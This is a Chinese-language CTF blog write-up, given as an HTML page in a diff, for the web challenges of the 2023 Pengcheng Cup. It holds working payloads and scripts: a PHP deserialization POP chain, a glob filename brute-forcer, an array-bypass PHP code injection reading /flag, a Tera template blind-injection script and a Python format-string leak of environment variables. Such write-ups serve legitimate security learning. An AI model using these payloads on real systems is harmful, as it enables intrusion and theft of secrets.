@@ -1,0 +1,454 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>[2023鹏城杯]WEB部分 WP | skkyblu3</title>
+<link rel="shortcut icon" href="https://skyblu3519.github.io/favicon.ico?v=1711466907097">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://skyblu3519.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="[2023鹏城杯]WEB部分 WP | skkyblu3 - Atom Feed" href="https://skyblu3519.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="web1
+PHP反序列化，给了一堆类。但解出来只需要两个
+&lt;?php
+show_source(__FILE__);
+error_reporting(0);
+
+class Hacker{
+  private $exp;
+  privat..." />
+    <meta name="keywords" content="WP,CTF" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://skyblu3519.github.io">
+  <img class="avatar" src="https://skyblu3519.github.io/images/avatar.png?v=1711466907097" alt="">
+  </a>
+  <h1 class="site-title">
+    skkyblu3
+  </h1>
+  <p class="site-description">
+    sky, blue and ...
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+      
+        <a href="https://skyblu3519.github.io/post/you-lian" class="menu">
+          友链
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              [2023鹏城杯]WEB部分 WP
+            </h2>
+            <div class="post-info">
+              <span>
+                2023-11-04
+              </span>
+              <span>
+                8 min read
+              </span>
+              
+                <a href="https://skyblu3519.github.io/tag/rDzRExHLX/" class="post-tag">
+                  # WP
+                </a>
+              
+                <a href="https://skyblu3519.github.io/tag/b7GKYdjmj/" class="post-tag">
+                  # CTF
+                </a>
+              
+            </div>
+            
+              <img class="post-feature-image" src="https://skyblu3519.github.io/post-images/2023-peng-cheng-bei-web-bu-fen-wp.jpeg" alt="">
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h1 id="web1">web1</h1>
+<p>PHP反序列化，给了一堆类。但解出来只需要两个</p>
+<pre><code class="language-php">&lt;?php
+show_source(__FILE__);
+error_reporting(0);
+
+class Hacker{
+  private $exp;
+  private $cmd;
+
+  public  function __toString()
+  {
+    call_user_func('system', &quot;cat /flag&quot;);
+  }
+}
+
+class H
+{
+    public $username=&quot;admin&quot;;
+    public function __destruct()
+    {
+        $this-&gt;welcome();
+
+    }
+    public  function welcome()
+    {
+        echo &quot;welcome~ &quot;.$this-&gt;username;
+    }
+}
+</code></pre>
+<p>pop构造</p>
+<pre><code class="language-php">&lt;?php
+class Hacker{
+}
+
+class H
+{
+    public function __construct(){
+        $this-&gt;username = new Hacker();
+    }
+}
+
+echo serialize(new H());
+</code></pre>
+<h1 id="web2">web2</h1>
+<p>F12提示文件：<code>backdoor_[a-f0-9]{16}.php</code></p>
+<p>用的scandir<br>
+<img src="https://skyblu3519.github.io/post-images/1699109888249.png" alt="" loading="lazy"></p>
+<p>使用glob逐位破解文件</p>
+<pre><code class="language-python">import requests
+
+burp0_url = &quot;http://172.10.0.5:80/&quot;
+burp0_headers = {&quot;Cache-Control&quot;: &quot;max-age=0&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;Origin&quot;: &quot;http://172.10.0.5&quot;, &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7&quot;, &quot;Referer&quot;: &quot;http://172.10.0.5/&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate, br&quot;, &quot;Accept-Language&quot;: &quot;en,zh-CN;q=0.9,zh;q=0.8&quot;, &quot;Connection&quot;: &quot;close&quot;}
+space = &quot;abcdef0123456789&quot;
+res = &quot;&quot;
+for _ in range(32):
+    for c in space:
+        burp0_data = {&quot;filename&quot;: f&quot;glob:///var/www/html/backdoor_{res+c}*&quot;}
+        resp = requests.post(burp0_url, headers=burp0_headers, data=burp0_data)
+        print(burp0_data)
+        # print(resp.text)
+        if &quot;yesyesyes!!!&quot; in resp.text:
+            res += c
+            print(res)
+            break
+</code></pre>
+<p>得到文件名称<code>backdoor_00fbc51dcdf9eef767597fd26119a894.php</code>。代码审计</p>
+<pre><code class="language-php">&lt;?php
+highlight_file(__FILE__);
+error_reporting(0);
+
+if(isset($_GET['username'])){
+    $sandbox = '/var/www/html/sandbox/'.md5(&quot;5050f6511ffb64e1914be4ca8b9d585c&quot;.$_GET['username']).'/';
+    mkdir($sandbox);
+    chdir($sandbox);
+    
+    if(isset($_GET['title'])&amp;&amp;isset($_GET['data'])){
+        $data = $_GET['data'];
+        $title= $_GET['title'];
+        if (strlen($data)&gt;5||strlen($title)&gt;3){
+            die(&quot;no!no!no!&quot;);
+        }
+        file_put_contents($sandbox.$title,$data);
+
+        if (strlen(file_get_contents($title)) &lt;= 10) {
+            system('php '.$sandbox.$title);
+        }
+        else{
+            system('rm '.$sandbox.$title);
+            die(&quot;no!no!no!&quot;);
+        }
+
+    }
+    else if (isset($_GET['reset'])) {
+        system('/bin/rm -rf ' . $sandbox);
+    }
+}
+?&gt;
+</code></pre>
+<p><code>$data</code>和<code>$title</code>都可以使用数组绕过</p>
+<pre><code class="language-php">&lt;?php
+$filename[] = &quot;skky&quot;;
+
+if (strlen($filename) &gt; 1){
+    echo &quot;block&quot;.PHP_EOL;
+}else{
+    echo &quot;bypass&quot;.PHP_EOL;
+}
+
+echo &quot;php &quot;.$filename.PHP_EOL;  // 与字符串拼接数组会转为 Array，最后拼接是php Array
+echo strlen(file_get_contents($filename));  // file_get_contents返回false, strlen处理是0
+</code></pre>
+<p>另外<code>file_put_contents</code>也是可以将数组作为data传递的<br>
+<img src="https://skyblu3519.github.io/post-images/1699116607795.png" alt="" loading="lazy"></p>
+<p>payload：</p>
+<pre><code>/?username=1&amp;data[]=&lt;?=`cat /flag`?&gt;&amp;title[]=kk
+</code></pre>
+<h1 id="tera">Tera</h1>
+<p>参考：<a href="https://blog.xinshijiededa.men/writeup/buaactf-2023/">https://blog.xinshijiededa.men/writeup/buaactf-2023/</a></p>
+<p>过滤了<code>{{</code>和<code>}}</code><br>
+<img src="https://skyblu3519.github.io/post-images/1699109904645.png" alt="" loading="lazy"></p>
+<p>使用控制语句盲注，注意到输入有长度限制。脚本逻辑如下</p>
+<pre><code class="language-py">import re
+
+import requests
+import string
+
+# 生成大小写字母加上数字的字符集
+charset = string.printable
+burp0_url = &quot;http://172.10.0.3:8081/&quot;
+burp0_headers = {&quot;Connection&quot;: &quot;close&quot;, &quot;Content-Type&quot;: &quot;text/plain&quot;}
+result = []
+for c in charset:
+    burp0_data = &quot;&quot;&quot;
+{{% set arr = &quot;skky&quot; %}}
+{{% for char in arr %}}
+    {{% if char != '{c}' %}}
+    ~@~
+    {{% endif %}}
+    {{% if char == '{c}' %}}
+    ~{c}~
+    {{% endif %}}
+{{% endfor %}}
+    &quot;&quot;&quot;.format(c=c)
+    # print(burp0_data)
+    resp = requests.post(burp0_url, headers=burp0_headers, data=burp0_data)
+    matches = re.findall(r'~(.*?)~', resp.text)
+    r = ''.join(matches)
+    print(r)
+    result.append(r)
+
+length = len(result[0])
+flag = &quot;&quot;
+for i in range(length):
+    for r in result:
+        if r == &quot;Erroccurswhilerendering&quot;:
+            pass
+        try:
+            if r[i] != &quot;@&quot;:
+                c = r[i]
+                flag += c
+        except:
+            pass
+print(length)
+print(flag)
+</code></pre>
+<p><code>get_env</code>函数可以获取环境变量，猜测flag在环境变量中。flag被过滤，根据<a href="https://crates.io/crates/tera/0.10.6">Tera的官方文档</a>，可以使用数组拼接<code>[&quot;fl&quot;,&quot;ag&quot;]| join()</code>。</p>
+<p>修改脚本line 13为<code>{{% set arr = get_env(name=[&quot;fl&quot;,&quot;ag&quot;]| join()) %}}</code><br>
+<img src="https://skyblu3519.github.io/post-images/1699109918811.png" alt="" loading="lazy"></p>
+<h1 id="escape">Escape</h1>
+<p>提示有源码<code>/source</code></p>
+<pre><code class="language-python">from sqlite3 import *
+
+from random import choice
+from hashlib import sha512
+
+from flask import Flask, request, Response
+from flask_limiter import Limiter
+from flask_limiter.util import get_remote_address
+
+app = Flask(__name__)
+limiter = Limiter(
+    app=app,
+    key_func=get_remote_address,
+    default_limits=[&quot;50000 per hour&quot;],
+    storage_uri=&quot;memory://&quot;,
+)
+
+salt = b'****************'
+
+class PassHash(str):
+    def __str__(self):
+        return sha512(salt + self.encode()).hexdigest()
+
+    def __repr__(self):
+        return sha512(salt + self.encode()).hexdigest()
+
+passhash = PassHash(''.join(choice(&quot;0123456789&quot;) for _ in range(16)))
+con = connect(&quot;users.db&quot;)
+cur = con.cursor()
+cur.execute(&quot;DROP TABLE IF EXISTS users&quot;)
+cur.execute(&quot;CREATE TABLE users(username, passhash)&quot;)
+passhash = PassHash(''.join(choice(&quot;0123456789&quot;) for _ in range(16)))
+cur.execute(
+    &quot;INSERT INTO users VALUES (?, ?)&quot;,
+    (&quot;admin&quot;, str(passhash))
+)
+con.commit()
+
+
+@app.route('/source')
+@limiter.limit(&quot;1/second&quot;)
+def source():
+    return Response(open(__file__).read(), mimetype=&quot;text/plain&quot;)
+
+
+@app.route('/')
+@limiter.limit(&quot;3/second&quot;)
+def index():
+    if 'username' not in request.args or 'password' not in request.args:
+        return open(&quot;index.html&quot;).read()
+    else:
+        username = request.args[&quot;username&quot;]
+        new_pwd = PassHash(request.args[&quot;password&quot;])
+        con = connect(&quot;users.db&quot;)
+        cur = con.cursor()
+        res = cur.execute(
+            &quot;SELECT * from users WHERE username = ? AND passhash = ?&quot;,
+            (username, str(new_pwd))
+        )
+        if res.fetchone():
+            return open(&quot;secret.html&quot;).read()
+        return (&quot;Sorry, we couldn't find a user '{user}' with password hash &lt;code&gt;{{passhash}}&lt;/code&gt;!&quot;
+                .format(user=username)
+                .format(passhash=new_pwd)
+                )
+
+
+if __name__ == &quot;__main__&quot;:
+    app.run('0.0.0.0', 10000)
+</code></pre>
+<p>漏洞点<code>return (&quot;Sorry, we couldn't find a user '{user}' with password hash &lt;code&gt;{{passhash}}&lt;/code&gt;!&quot;.format(user=username).format(passhash=new_pwd))</code>，两次<code>format</code>可以操作<code>passhash</code>变量达到一个类似于模版注入的效果，参考：<br>
+<a href="https://www.leavesongs.com/PENETRATION/python-string-format-vulnerability.html">Python 格式化字符串漏洞</a></p>
+<p>但这里只能信息泄露，不能函数调用。最后在环境变量中找到了flag<br>
+<img src="https://skyblu3519.github.io/post-images/1699109945862.png" alt="" loading="lazy"></p>
+<p>PS.比赛的时候完全没有注意到，其实这里的密码是可以得到的。</p>
+<pre><code class="language-python">class PassHash(str):
+    def __str__(self):
+        return sha512(salt + self.encode()).hexdigest()
+
+    def __repr__(self):
+        return sha512(salt + self.encode()).hexdigest()
+</code></pre>
+<p><code>PassHash</code>其实是继承了str类然后重写了<code>__str__</code>和<code>__repr__</code>方法，虽然在使用passhash的时候（<code>print()</code>, <code>str()</code>）会计算hash值，但它本质上还是一个字符串</p>
+<pre><code class="language-python">passhash = PassHash('123456789')
+print(len(passhash))    # 输出 9
+for i in passhash:      # 打印每一位，输出123456789
+    print(i, end='')
+</code></pre>
+<p>所以可以用下标访问到passhash的每一位<code>passhash.__str__.__globals__[passhash][0]</code>，也就可以得到密码。而输入正确的密码后，题目才会告诉flag在环境变量中😢</p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#web1">web1</a></li>
+<li><a href="#web2">web2</a></li>
+<li><a href="#tera">Tera</a></li>
+<li><a href="#escape">Escape</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://skyblu3519.github.io/post/idea-she-qu-ban-ben-chuang-jian-servlet-xiang-mu/">
+              <h3 class="post-title">
+                IDEA社区版本创建Servlet项目
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://skyblu3519.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
